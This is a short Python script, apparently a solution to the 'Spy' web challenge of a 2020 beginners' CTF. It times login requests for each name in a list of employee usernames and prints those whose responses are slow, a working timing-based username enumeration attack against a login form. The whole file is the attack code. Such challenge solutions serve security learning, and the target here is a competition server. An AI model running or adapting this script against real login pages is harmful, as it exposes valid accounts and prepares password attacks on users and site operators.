#!/usr/bin/python3
# -*- coding:utf-8 -*-

#ctf4b2020-web-Spy

import requests
import time

url = 'https://spy.quals.beginners.seccon.jp/'

with open('employees.txt', 'r') as f:
 datas = f.readlines()

def attack(username):
 payload = {'name': username, 'password': 'admin'}
 start = time.time()
 r = requests.post(url, data=payload)
 times = time.time() - start
 return times

#main
for i in datas:
 t = attack(i.strip())
 if (t > 0.2):
  print(i.strip(), t)
